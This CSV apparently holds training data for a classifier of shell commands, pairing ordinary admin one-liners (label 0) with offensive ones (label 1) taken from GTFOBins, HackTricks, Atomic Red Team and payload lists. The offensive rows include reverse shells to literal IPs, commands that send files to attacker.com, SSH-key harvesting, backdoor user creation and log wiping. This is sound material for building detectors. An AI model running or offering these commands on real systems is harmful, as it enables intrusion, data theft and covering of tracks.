id,command,label,source,split
d1_009470,chmod 644 migration.tar.gz,0,bash_instruct,train
d1_009471,sudo pacman -S notes-up,0,linlm,train
d1_009473,w -h erin,0,bash_instruct,train
d1_009475,ssh -L 9001:localhost:8000 user@target,1,hacktricks,train
d1_009476,./backup.sh > messages 2>&1,0,bash_instruct,train
d1_009477,grep -RInE 'iptables|bpfd|dockerd|hpas|/dev/shm|/var/tmp|/tmp/' /etc/systemd /etc/init.d /etc/rc*.d /etc/cron* 2>/dev/null,1,hacktricks,train
d1_009478,curl -O https://h3cf88e0a.example.net/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh,1,atomic_red_team,train
d1_009479,zsoelim /path/to/input-file,1,gtfobins,train
d1_009480,(ls -t|head -n X;ls)|sort|uniq -u|xargs rm,0,nl2bash,train
d1_009481,find migrations -type f -size +100M,0,bash_instruct,train
d1_009484,whois -h attacker.com -p 12345 DATA,1,gtfobins,train
d1_009485,rsync -a --info=progress2 src/ dest/,0,bash6k,train
d1_009487,"cut -d, -f2 transactions.tsv | sort | uniq -c | sort -nr | head -n 5",0,bash_instruct,train
d1_009488,"ps ux | yank -g ""[0-9]+""",0,tldr,train
d1_009489,"sed 's/\t/,/g' profile.txt > profile.txt.csv",0,bash_instruct,train
d1_009491,cp -u customer.old backup/,0,bash_instruct,train
d1_009492,cp -p config.yaml /etc/myapp/,0,bash6k,train
d1_009494,"find / ! -path ""*/proc/*"" ! -path ""/sys/*"" -perm -2 -type f -exec ls -la {} 2>/dev/null \;",1,slp,train
d1_009495,sudo synopkg start|stop package,0,tldr,train
d1_009496,"find / -user nobody -atime +180 -type f -print0 | while IFS= read -r -d '' f; do chmod 640 ""$f"" && echo ""$(date +'%F %T') CHANGED: $f"" >> /var/log/nobody_cleanup.log; done",0,bash6k,train
d1_009497,"socat tcp-connect:attacker.com:12345 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'",1,gtfobins,train
d1_009498,nl notes.js,0,bash_instruct,train
d1_009499,"for i in `seq 1 255`; do ping -c 1 -w 1 192.168.1.$i > /dev/null 2>&1; if [ $? -eq 0 ]; then echo ""192.168.1.$i is UP""; fi ; done",1,payloads,train
d1_009500,chmod +x access.md,0,bash_instruct,train
d1_009501,mktorrent [-a|--announce] tracker_announce_url -w web_seed_url [-l|--piece-length] 21 [-o|--output] path/to/example.torrent path/to/file_or_directory,0,tldr,train
d1_009504,cat /proc/$$/timens_offsets 2>/dev/null,1,hacktricks,train
d1_009505,systemctl is-active haproxy,0,bash_instruct,train
d1_009506,"echo ""Your string here""| tr ' ' '\n' | tail -n1",0,nl2bash,train
d1_009507,dash -i >& /dev/udp/76.132.177.92/8000 0>&1,1,quasarnix,train
d1_009508,pbmreduce n path/to/image.pbm > path/to/output.pbm,0,tldr,train
d1_009509,mv *.jpg vendor/,0,bash_instruct,train
d1_009510,cs launch application_name:application_version -- argument1 argument2 ...,0,tldr,train
d1_009511,"newest_proc(){ local pattern=""$1""; ps -eo pid,lstart,cmd --sort=start_time | grep -i ""$pattern"" | tail -n1 | awk '{print $1, $2"" ""$3"" ""$4"" ""$5"" ""$6"" ""$7}'; }",0,bash6k,train
d1_009512,readlink /proc/self/ns/cgroup,1,hacktricks,train
d1_009513,gladtex path/to/input.htex,0,tldr,train
d1_009514,"openclaw agent [-m|--message] ""Ship checklist""",0,tldr,train
d1_009515,ss -tp,0,linlm,train
d1_009517,sudo runuser user [-l|--login],0,tldr,train
d1_009518,rabbitmq-streams delete_replica stream node,0,tldr,train
d1_009519,toolbox help,0,tldr,train
d1_009520,"ss -tulpn | awk '/^tcp/ && /root/ {split($5, a, "":""); printf ""%s %s %s\n"", $6, $7, a[2]}' | sort -k3,3n",0,bash6k,train
d1_009522,sudo cpuctl list,0,tldr,train
d1_009523,docker run --rm debian:stable-slim ipcs,1,hacktricks,train
d1_009524,dex [-a|--autostart] [-d|--dry-run],0,tldr,train
d1_009525,cp /bin/sh /usr/lib/zypper/commands/zypper-x,1,gtfobins,train
d1_009526,"influx -execute ""influxql_command"" -format json|csv|column",0,tldr,train
d1_009527,cat /host/proc/sys/kernel/core_pattern 2>/dev/null,1,hacktricks,train
d1_009529,tldr setarch,0,tldr,train
d1_009530,find /dir -type f -size 0 -print,0,nl2bash,train
d1_009531,curl -o file.txt https://h0caaf24a.example.net/file.txt,0,bash6k,train
d1_009532,gendesk [-h|--help],0,tldr,train
d1_009533,"perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>""attacker.com"", PeerPort=>80, Proto=>""tcp"") or die;open(my $file, ""<"", ""/path/to/input-file"") or die;$content = join("""", <$file>);close($file);$headers = ""POST / HTTP/1.1\r\nHost: attacker.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: "" . length($content) . ""\r\nConnection: close\r\n\r\n"";print $s $headers . $content;while (<$s>) { }close($s);'",1,gtfobins,train
d1_009534,csv-diff path/to/file1.csv path/to/file2.csv --key column_name,0,tldr,train
d1_009535,"unshare -Ur true 2>/dev/null && echo ""unshare works""",1,hacktricks,train
d1_009536,watch [-d|--differences] df,0,tldr,train
d1_009537,qm [g|guest] exec 100 argument1 argument2... --timeout 10,0,tldr,train
d1_009538,seq 1 10 | sort -R | tee /tmp/lst |cat <(cat /tmp/lst) <(echo '-------') | tac,0,nl2bash,train
d1_009539,zeroclaw channel doctor,0,tldr,train
d1_009540,ssh -f user@gateway -p 24222 -L 3307:10.195.88.8:3306 -N,0,nl2bash,train
d1_009541,sudo systemctl restart cron,0,bash_instruct,train
d1_009542,useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art,1,atomic_red_team,train
d1_009543,find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50,1,hacktricks,train
d1_009544,"cat summary.csv | awk '{ print length, $0 }' | sort -rn | head -20 | cut -d' ' -f2-",0,bash_instruct,train
d1_009545,"echo ""[Service]"" >> /dev/shm/atomic_shm.service",1,atomic_red_team,train
d1_009546,orb create vm_name ubuntu|fedora|arch|debian,0,tldr,train
d1_009549,chmod 644 output.old,0,bash_instruct,train
d1_009551,"echo ""# THIS IS A COMMENT"" >> /etc/ufw/ufw.conf",1,atomic_red_team,train
d1_009552,sudo log collect --last 1h --output path/to/file.logarchive,0,tldr,train
d1_009553,find /tmp -size 0 -atime +10 -exec ls -l {} \; > /tmp/checkold.txt,0,nl2bash,train
d1_009556,git secret init,0,tldr,train
d1_009558,"cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v ""^#""",1,hacktricks,train
d1_009559,mv settings.xml settings.xml.old,0,bash_instruct,train
d1_009560,find . -name FOLDER1 -prune -o -name filename -delete,0,nl2bash,train
d1_009561,/bin/dash -i 3<> /dev/udp/95.215.10.36/37354 0<&3 1>&3 2>&3,1,quasarnix,train
d1_009563,cut -d '' -f1 /path/to/input-file,1,gtfobins,train
d1_009565,aws s3 sync path/to/directory s3://bucket_name,0,tldr,train
d1_009566,komac update Package.Identifier [-v|--version] 1.2.3 [-u|--urls] https://h0caaf24a.example.net/app.exe https://h0caaf24a.example.net/app.msi ... [-s|--submit],0,tldr,train
d1_009567,od -cvAnone -w1,0,nl2bash,train
d1_009568,mv response.yaml response.yaml.old,0,bash_instruct,train
d1_009569,mv -n server.zip server.zip.old,0,bash_instruct,train
d1_009570,cat /proc/bus/pci/devices,0,linlm,train
d1_009572,"grep -R ""ERROR"" /var/log/*.log",0,bash6k,train
d1_009573,rename .ext .bak *.ext,0,tldr,train
d1_009574,chmod go-w sales.bak,0,bash_instruct,train
d1_009576,cat request.log | sort | uniq -c | sort -nr,0,bash_instruct,train
d1_009577,unzip -p /path/to/temp-file,1,gtfobins,train
d1_009578,scp postgres@db01.example.org:/var/log/error.log .,0,bash_instruct,train
d1_009579,env -u FOO somecommand,0,nl2bash,train
d1_009580,"while :; do continue; echo ""This will never be reached""; done",0,tldr,train
d1_009581,ps -u jenkins,0,bash_instruct,train
d1_009583,/path/to/binary,1,hacktricks,train
d1_009584,shuf --head-count=5 path/to/file,0,tldr,train
d1_009585,"curl -s ""https://heef77ba6.example.net/London?format=j1"" | jq -r '.current_condition[0].temp_C'",0,bash6k,train
d1_009586,pypy -i path/to/file.py,0,tldr,train
d1_009587,pgrep -n python3,0,bash_instruct,train
d1_009588,wc -l response.pdf,0,bash_instruct,train
d1_009589,sq verify --signer-file path/to/signer.asc --cleartext path/to/file,0,tldr,train
d1_009590,sudo brctl add bridge_name,0,tldr,train
d1_009593,tldr ticketConverter.py,0,tldr,train
d1_009594,hut git|hg create name,0,tldr,train
d1_009597,"find /data -type f -name ""*.json"" -print0 |",0,bash6k,train
d1_009598,resize2fs -M /dev/sdXN,0,tldr,train
d1_009599,"echo '! exec ""/bin/sh &""' | PERL_MM_USE_DEFAULT=1 cpan",1,atomic_red_team,train
d1_009600,date >> dmesg.log,0,bash_instruct,train
d1_009601,"clisp -x '(ext:run-shell-command ""/bin/sh"")(ext:exit)'",1,gtfobins,train
d1_009602,"sed 's/\t/,/g' archive.json > archive.json.csv",0,bash_instruct,train
d1_009604,uniq -d auth.txt,0,bash_instruct,train
d1_009605,sudo chown -R admin:wheel reports,0,bash_instruct,train
d1_009609,node inspect 134.223.166.250:4444,1,hacktricks,train
d1_009610,sudo dnf clean all|dbcache|expire-cache|metadata|packages,0,tldr,train
d1_009611,dpkg-deb [-W|--show] path/to/file.deb,0,tldr,train
d1_009612,kind create cluster,0,linlm,train
d1_009613,sudo waydroid init,0,tldr,train
d1_009614,sed '/^$/d' invoice.tsv,0,bash_instruct,train
d1_009615,php -S localhost:8000,0,linlm,train
d1_009616,find / -name id_rsa 2>/dev/null -exec cp --parents {} /tmp/art-staging \;,1,atomic_red_team,train
d1_009617,sudo chown ec2-user auth.zip,0,bash_instruct,train
d1_009618,wpscan --url url --stealthy,0,tldr,train
d1_009619,kubectl run nginx-dev --image nginx --port 80,0,tldr,train
d1_009620,pnmnorm path/to/image.pnm > path/to/output.pnm,0,tldr,train
d1_009621,~/.bash_login,1,hacktricks,train
d1_009622,systemsetup -setsleep off -setrestartpowerfailure on -setrestartfreeze on,0,tldr,train
d1_009624,podman image prune [-a|--all],0,tldr,train
d1_009625,stressapptest -M memory,0,tldr,train
d1_009626,MYVAR=`git ls-files -m|wc -l|tr -d ' '`,0,nl2bash,train
d1_009627,rustdoc src/lib.rs,0,tldr,train
d1_009628,"ffuf -w path/to/postdata.txt -X POST -d ""username=admin\&password=FUZZ"" -u https://h0caaf24a.example.net/login.php -fc 302,401-499 -fs 1234",0,tldr,train
d1_009629,sudo chown alice build.js,0,bash_instruct,train
d1_009630,cp lib*.so ~/usr/gtest/lib,0,nl2bash,train
d1_009631,command --help,0,linlm,train
d1_009632,cat >/path/to/temp-dir/y.conf<<EOF,1,gtfobins,train
d1_009633,tar -czf - tests | ssh mysql@cdn.internal 'cat > /backup/tests.tar.gz',0,bash_instruct,train
d1_009634,az storage entity merge [-e|--entity] space_separated_key_value_pairs [-t|--table-name] table_name --account-name storage_account_name --account-key storage_account_key,0,tldr,train
d1_009635,pathchk path1 path2 ...,0,tldr,train
d1_009636,cat /dev/null > /var/log/messages #truncating the file to zero bytes,1,atomic_red_team,train
d1_009637,find whatever -print0 | xargs -0 command,0,nl2bash,train
d1_009639,find . ! -name . -prune,0,nl2bash,train
d1_009640,cp -p release.csv bin/,0,bash_instruct,train
d1_009641,npm [up|update] package [-g|--global],0,tldr,train
d1_009642,lbu [ci|commit],0,tldr,train
d1_009643,PYTHON_EXE=$(command -v python3 || command -v python),1,atomic_red_team,train
d1_009644,firejail --net=eth0 --ip=164.49.81.39 /etc/init.d/apache2 start,0,tldr,train
d1_009646,"cut -d, -f7 error.log | sort | uniq -c | sort -nr | head -n 15",0,bash_instruct,train
d1_009647,ls -l /host/tmp/selinux_test 2>/dev/null,1,hacktricks,train
d1_009648,ls /proc | head,1,hacktricks,train
d1_009649,cat order.conf | sort -u,0,bash_instruct,train
d1_009650,sudo pkgtool --setup_menu,0,tldr,train
d1_009651,sort list.txt | uniq -d > duplicates.txt,0,bash6k,train
d1_009652,git cliff > CHANGELOG.md,0,tldr,train
d1_009655,yes | command,0,nl2bash,train
d1_009656,cp auth.old auth.old.bak,0,bash_instruct,train
d1_009658,cp -r $1 $2,0,nl2bash,train
d1_009659,date -d @$TIMESTAMP,0,nl2bash,train
d1_009660,cp report.csv report_$(date +%F).csv,0,bash6k,train
d1_009661,docker run --rm --security-opt no-new-privileges:true debian:stable-slim sh -c 'apt-get update >/dev/null 2>&1 && apt-get install -y passwd >/dev/null 2>&1 && grep NoNewPrivs /proc/self/status && /bin/su -c id 2>/dev/null',1,hacktricks,train
d1_009662,apt-cache show nginx | grep Version,0,bash6k,train
d1_009663,lp /path/to/input-file -h attacker.com,1,gtfobins,train
d1_009664,kubectl debug --image image [-c|--container] container_name pod_name,0,tldr,train
d1_009666,cat /proc/sys/vm/panic_on_oom 2>/dev/null,1,hacktricks,train
d1_009668,libcustom.so => /tmp/libcustom.so (0x00007fcb07756000),1,hacktricks,train
d1_009669,nl sales.conf,0,bash_instruct,train
d1_009670,"{echo,test}",1,hacktricks,train
d1_009671,openssl enc -aes-256-cbc -pass pass:atomic_enc_pass -p -in /tmp/t1560/t1560_data.zip -out /tmp/t1560/t1560_data.enc,1,atomic_red_team,train
d1_009672,"echo -e ""GET / HTTP/1.1\nHost: host\n\n"" | nc host 80",0,tldr,train
d1_009673,ogr2ogr -s_srs EPSG:4326 -t_srs EPSG:3857 -f GPKG path/to/output.gpkg path/to/input.gpkg,0,tldr,train
d1_009674,curl -s http://he8217cc0.example.net/_node/pipelines?pretty,1,hacktricks,train
d1_009676,"grep -E -o ""(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"" file.txt",1,hacktricks,train
d1_009679,[ -f request.bak ] && cat request.bak || echo 'not found',0,bash_instruct,train
d1_009680,mkdir -m 700 images,0,bash_instruct,train
d1_009682,yelp man:/path/to/input-file,1,gtfobins,train
d1_009683,rm `find tmp -maxdepth 1 -name '*.mp3'`,0,nl2bash,train
d1_009684,"ack ""search_pattern""",0,tldr,train
d1_009685,PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin,1,hacktricks,train
d1_009686,firewall-cmd --permanent --zone public --remove-service http,0,tldr,train
d1_009688,"join -t, -11 -2 1 <(sort -t, -k1,1 ids.csv) <(sort -t, -k1,1 names.csv) | join -t, -1 1 -2 1 - <(sort -t, -k1,1 scores.csv) | awk -F, '{printf ""%s,%s,%s\n"", $1, $2? $2:""N/A"", $3? $3:""N/A""}' > combined.csv",0,bash6k,train
d1_009691,telnet host,0,tldr,train
d1_009693,knockd [-d|--daemon],0,tldr,train
d1_009694,avifenc --speed 2 path/to/input.png path/to/output.avif,0,tldr,train
d1_009695,mount -t cgroup -o rdma cgroup /tmp/cgrp,1,hacktricks,train
d1_009696,"grep -R ""dataservice"" /etc /opt 2>/dev/null | head",1,hacktricks,train
d1_009697,"find /opt/data -type f -exec md5sum {} + | sort | awk 'BEGIN{prev="""";files=""""} $1==prev{files=files"" ""$2} $1!=prev{if(files!="""") print files; files=$2} {prev=$1} END{if(files!="""") print files}' > duplicates.txt",0,bash6k,train
d1_009699,sudo systemctl enable --now polipo,0,linlm,train
d1_009700,cat session.tsv | wc -l,0,bash_instruct,train
d1_009701,uvcdynctrl [-l|--list],0,tldr,train
d1_009702,xxd -l 64 export.html,0,bash_instruct,train
d1_009703,find . -name \*.c -print | xargs grep hogehoge,0,nl2bash,train
d1_009704,0<&3;exec 3<>/dev/tcp/76.132.177.92/44215; /bin/dash <&3 >&3 2>&3,1,quasarnix,train
d1_009705,echo change > /sys/class/mem/null/uevent,1,hacktricks,train
d1_009706,"find ""$directory"" -perm ""$permissions""",0,nl2bash,train
d1_009707,docker [update|container update] --memory-swap limitM container_name,0,tldr,train
d1_009708,grep -c 'failed' error.log,0,bash_instruct,train
d1_009709,find /myfiles -type d,0,nl2bash,train
d1_009710,cat >/path/to/temp-dir/action.d/x.conf <<EOF,1,gtfobins,train
d1_009711,lynx -anonymous example.com,0,tldr,train
d1_009713,cat file | clipboard,0,nl2bash,train
d1_009714,cacademo,0,tldr,train
d1_009715,lspath,0,tldr,train
d1_009716,find tests -type f -user dave,0,bash_instruct,train
d1_009717,bg %1,0,linlm,train
d1_009718,chmod 744 config.conf,0,bash_instruct,train
d1_009719,startx -- -dpi value,0,tldr,train
d1_009721,rc-update,0,tldr,train
d1_009722,git clone https://hc2208abd.example.net/TarlogicSecurity/tickey,1,hacktricks,train
d1_009723,shellcheck path/to/script.sh,0,tldr,train
d1_009724,chmod 644 server.yaml,0,bash_instruct,train
d1_009725,xxd -l 64 changelog.txt,0,bash_instruct,train
d1_009726,find -type f -exec grep -Iq . {} \; -and -print,0,nl2bash,train
d1_009727,uniq product.conf,0,bash_instruct,train
d1_009728,fpsync -v -n 8 -E /path/to/source/ /path/to/destination/,0,tldr,train
d1_009730,var2=$(echo $myvar | wc -c),0,nl2bash,train
d1_009731,uniq -d output.txt,0,bash_instruct,train
d1_009732,stat payload.csv,0,bash_instruct,train
d1_009733,mv migration.js releases/,0,bash_instruct,train
d1_009734,stat -c '%s' build.gz,0,bash_instruct,train
d1_009735,df [-x|--exclude-type] squashfs [-x|--exclude-type] tmpfs,0,tldr,train
d1_009737,gnmic [-a|--address] ip:port [-u|--username] username [-p|--password] password capabilities,0,tldr,train
d1_009739,find /dir -xdev \( -nouser -o -nogroup \) -print,1,slp,train
d1_009742,uniq -d metrics.csv,0,bash_instruct,train
d1_009743,cat release.txt | sort -u,0,bash_instruct,train
d1_009744,autossh -M monitor_port -L local_port:localhost:remote_port user@host,0,tldr,train
d1_009745,cat /proc/sys/fs/binfmt_misc/status 2>/dev/null,1,hacktricks,train
d1_009746,cat dump.tsv | sort -u,0,bash_instruct,train
d1_009747,nc -u -lvp 4242,1,payloads,train
d1_009748,docker run --name t1612_container --rm -d -t t1612,1,atomic_red_team,train
d1_009749,ico -obj cube -size 100x100 -delta +1+2,0,tldr,train
d1_009750,docker run --rm -it --pids-limit=64 debian:stable-slim bash,1,hacktricks,train
d1_009751,find . -name '*.pdf' -exec rm {} +,0,nl2bash,train
d1_009753,"duration=60; interval=5; samples=$((duration/interval)); total_user=0; total_sys=0; for i in $(seq 1 $samples); do read -r _ user sys _ < <(top -bn1 | grep '^%Cpu' | awk -F',' '{print $1,$2}'); total_user=$(echo ""$total_user + $user"" | bc); total_sys=$(echo ""$total_sys + $sys"" | bc); sleep $interval; done; avg_user=$(echo ""scale=2; $total_user/$samples"" | bc); avg_sys=$(echo ""scale=2; $total_sys/$samples"" | bc); echo ""Average User: $avg_user% Average System: $avg_sys%""",0,bash6k,train
d1_009754,cp results.sql dist/,0,bash_instruct,train
d1_009755,usermod --lock art,1,atomic_red_team,train
d1_009756,"echo ""include /tmp/conf/*"" > fake.ld.so.conf",1,hacktricks,train
d1_009757,"mkdir -p /tmp/csv_converted; tar -xzf data.tar.gz --wildcards --no-anchored ""*.csv"" -O | while IFS= read -r -d '' file; do base=$(basename ""$file"" .csv); awk -F',' 'BEGIN{OFS=""\t""} {$1=$1; print}' ""$file"" > ""/tmp/csv_converted/${base}.tsv""; done",0,bash6k,train
d1_009758,head -n 1 results.txt,0,bash_instruct,train
d1_009759,find .vim/ -maxdepth 1 -type d,0,nl2bash,train
d1_009760,sudo insmod ./example.ko,1,hacktricks,train
d1_009761,"grep -Ri ""timeout"" /etc --include='*.conf' -n > /tmp/timeout_refs.log",0,bash6k,train
d1_009762,"grep -R ""TODO"" --include=""*.c"" -n .",0,bash6k,train
d1_009763,npm-why package,0,tldr,train
d1_009764,bun pm pkg delete property,0,tldr,train
d1_009765,"wacli contacts search ""name"" --json --store path/to/store",0,tldr,train
d1_009766,pacman -Ql package_name,0,linlm,train
d1_009767,find . -maxdepth 1 -type d -print0 | xargs -0 -I {} sh -c 'echo $(find {} | wc -l) {}' | sort -n,0,nl2bash,train
d1_009768,sudo tune2fs -l /dev/sda1 | grep -i check,0,linlm,train
d1_009769,aws kendra list-query-suggestions --index-id index_id --query-text query_text,0,tldr,train
d1_009771,cat /tmp/T1087.001.txt 2>/dev/null,1,atomic_red_team,train
d1_009772,"espeak-ng -v voice ""text""",0,tldr,train
d1_009773,conda package [-r|--reset],0,tldr,train
d1_009774,chmod 744 summary.gz,0,bash_instruct,train
d1_009775,"set x ""DATA""",1,gtfobins,train
d1_009776,gcore $PID,1,gtfobins,train
d1_009778,tr -d '0-9' < archive.md,0,bash_instruct,train
d1_009779,"sed 's/\t/,/g' event.csv > event.csv.csv",0,bash_instruct,train
d1_009780,sudo lshw [-c|-class] network -sanitize,0,tldr,train
d1_009781,tail -n 20 users.log,0,bash_instruct,train
d1_009783,sudo chown root /tmp/hello.c,1,atomic_red_team,train
d1_009784,sudo ventoy -i -n /dev/sdX,0,tldr,train
d1_009785,rails db:setup,0,tldr,train
d1_009786,/usr/bin/dash -i >& /dev/udp/32.152.48.219/80 0>&1,1,quasarnix,train
d1_009787,chmod +x settings.tmp,0,bash_instruct,train
d1_009788,cp build.jpg build.jpg.bak,0,bash_instruct,train
d1_009789,mount -t cgroup -o memory cgroup ${CGROUP_MOUNT},1,hacktricks,train
d1_009790,find /tmp/ -type f -mtime +1 -print0 | xargs -0 -n1 rm,0,nl2bash,train
d1_009791,sort -nr data.txt,0,bash_instruct,train
d1_009792,hugo server [-e|--environment] production --disableFastRender --minify,0,tldr,train
d1_009795,hub browse owner/repository subpage,0,tldr,train
d1_009797,ip neighbour show,1,atomic_red_team,train
d1_009798,mawk '//' /path/to/input-file,1,gtfobins,train
d1_009799,paclog --commandline,0,tldr,train
d1_009800,kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL',1,hacktricks,train
d1_009801,eu-readelf [-a|--all] path/to/file,0,tldr,train
d1_009802,uniq -d profile.conf,0,bash_instruct,train
d1_009803,jj revert [-r|--revisions] revsets [-B|--insert-before] revsets [-A|--insert-after] revsets,0,tldr,train
d1_009804,"tree -if | grep \\.[ch]\\b | xargs -n 1 grep -H ""#include""",0,nl2bash,train
d1_009805,"hydra -l admin -P passwords.txt example.com http-post-form ""/login:username=^USER^&password=^PASS^:F=incorrect""",0,linlm,train
d1_009806,tt -quotes en,0,tldr,train
d1_009807,seinfo -r 2>/dev/null | head,1,hacktricks,train
d1_009808,bridge [mo|monitor],0,tldr,train
d1_009809,vet inspect malware --purl package_url,0,tldr,train
d1_009810,podman-compose up --build,0,tldr,train
d1_009811,"codespell [-L|--ignore-words-list] ignored_word1,ignored_word2,...",0,tldr,train
d1_009813,command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules,1,hacktricks,train
d1_009814,echo -e 'x\nx' | passwd,1,gtfobins,train
d1_009815,kubectl create -f src/cronjob.yaml -n default,1,atomic_red_team,train
d1_009816,"find . -type d -name 'uploads' | while read d; do chmod -R 755 ""$d""; done",0,nl2bash,train
d1_009817,apparmor_status,1,hacktricks,train
d1_009818,sudo chgrp staff auth.tar.gz,0,bash_instruct,train
d1_009819,find -type d -empty -exec rmdir -vp --ignore-fail-on-non-empty {} `;`,0,nl2bash,train
d1_009821,cat transaction.yaml | sort | uniq,0,bash_instruct,train
d1_009823,pnmcrop [-w|-white] path/to/image.pnm > path/to/output.pnm,0,tldr,train
d1_009825,mv *.cache docs/,0,bash_instruct,train
d1_009828,cat catalog.tsv | sort | uniq,0,bash_instruct,train
d1_009829,luatex -shell-escape '\directlua{...}\end',1,gtfobins,train
d1_009830,tlmgr conf texmf|tlmgr|updmap,0,tldr,train
d1_009831,"echo 'package main;import""os/exec"";import""net"";func main(){c,_:=net.Dial(""tcp"",""15.22.101.194:4242"");cmd:=exec.Command(""/bin/sh"");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",1,payloads,train
d1_009833,hadolint --trusted-registry docker.io --trusted-registry example.com:5000 path/to/Dockerfile1 path/to/Dockerfile2 ...,0,tldr,train
d1_009834,gdu --no-hidden,0,tldr,train
d1_009835,test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt),1,atomic_red_team,train
d1_009836,ip netns exec foo /bin/sh -p,1,gtfobins,train
d1_009837,debugfs: ls,1,hacktricks,train
d1_009838,GetUserSPNs.py domain/username -hashes LM_Hash:NT_Hash -dc-ip domain_controller_ip,0,tldr,train
d1_009840,dig +tcp +time=2 +tries=1 @65.150.41.161 google.com A,1,hacktricks,train
d1_009841,"lsof -i -nP -a -u root | awk 'NR>1 {print $2, $1, $9}' | sort -u > /tmp/root_net_procs.txt",0,bash6k,train
d1_009842,"python2 -c 'import pty; pty.spawn(""/bin/sh"")'",1,slp,train
d1_009843,sudo chown tomcat dump.css,0,bash_instruct,train
d1_009844,dd of=/var/log/syslog if=/dev/zero count=$(ls -l /var/log/syslog | awk '{print $5}') iflag=count_bytes,1,atomic_red_team,train
d1_009845,"jq -r '.[] | select(.level==""error"") | [.service, .message] | @tsv' /var/log/app.json \",0,bash6k,train
d1_009846,"cut -d, -f7 users.csv | sort | uniq -c | sort -nr | head -n 15",0,bash_instruct,train
d1_009848,zopflipng input.png output.png,0,tldr,train
d1_009849,cat archive.conf | wc -l,0,bash_instruct,train
d1_009850,date >> server.log,0,bash_instruct,train
d1_009851,crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null,1,hacktricks,train
d1_009853,sudo su -l oracle,0,nl2bash,train
d1_009854,chown -R alice:alice *.php,1,hacktricks,train
d1_009855,bridge -b /path/to/input-file,1,gtfobins,train
d1_009856,read -d'' -s -n1,0,nl2bash,train
d1_009857,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' summary.json | sort -u,0,bash_instruct,train
d1_009858,"socat - exec:/bin/sh,pty,ctty,raw,echo=0",1,gtfobins,train
d1_009859,conan remote list,0,tldr,train
d1_009860,mv -n event.txt event.txt.old,0,bash_instruct,train
d1_009861,echo known_md5_checksum_of_the_file path/to/file | md5sum [-c|--check],0,tldr,train
d1_009862,pg_ctl [-D|--pgdata] data_directory restart,0,tldr,train
d1_009863,path/to/start-server.sh -servername server_name,0,tldr,train
d1_009864,"grep -R ""ERROR"" /var/log/*.log -n",0,bash6k,train
d1_009865,sudo systemctl stop service-name,0,linlm,train
d1_009867,find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null,1,hacktricks,train
d1_009868,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' inventory.json | sort -u,0,bash_instruct,train
d1_009869,schroot --all command,0,tldr,train
d1_009870,w -h $euids,0,nl2bash,train
d1_009872,pbmtonokia [-f|-fmt] NPM path/to/image.pbm > path/to/output.npm,0,tldr,train
d1_009873,sudo chgrp deploy profile.zip,0,bash_instruct,train
d1_009874,jless [-r|--relative-line-numbers] path/to/file.json,0,tldr,train
d1_009875,"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null",1,gtfobins,train
d1_009878,http://h86dd1cf4.example.net/?cmd=>on,1,hacktricks,train
d1_009879,sq inspect path/to/file.pgp,0,tldr,train
d1_009880,mv inventory.txt inventory.txt.old,0,bash_instruct,train
d1_009881,sudo tmutil enable,0,tldr,train
